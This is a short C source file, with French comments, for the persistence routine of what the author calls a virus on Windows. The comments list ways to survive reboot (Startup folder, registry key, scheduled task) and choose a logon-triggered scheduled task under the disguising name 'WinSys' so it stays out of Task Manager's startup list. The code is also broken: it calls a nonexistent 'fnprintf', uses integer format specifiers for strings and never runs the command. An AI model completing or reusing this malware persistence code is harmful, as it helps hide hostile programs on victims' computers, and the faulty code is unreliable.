#include <stdio.h>
#include <shellapi.h>
#include <windows.h>

void set_persistance(char * softwareDataDirectory, char * executable_name){

    /*Pour la parsistance du virus il y aa plusieurs manières de faire:
        - copier dans le dossier de démarage:  C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
          le virus.exe

        - creer une clef de registre

        - créer une planification de tache windows (méthode choisi):
          le virus se lance au démarage et il n'apparaît pas au démarage dans le gestionnaire des taches
        
    */

    SHELLEXECUTEINFO sei;
    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);  
    sei.lpFile = "cmd.exe"; 
    char cmd[1024];
    fnprintf(cmd, "schtasks /create /tn WinSys /tr \"%d%d\" /sc onlogon", softwareDataDirectory, executable_name);
};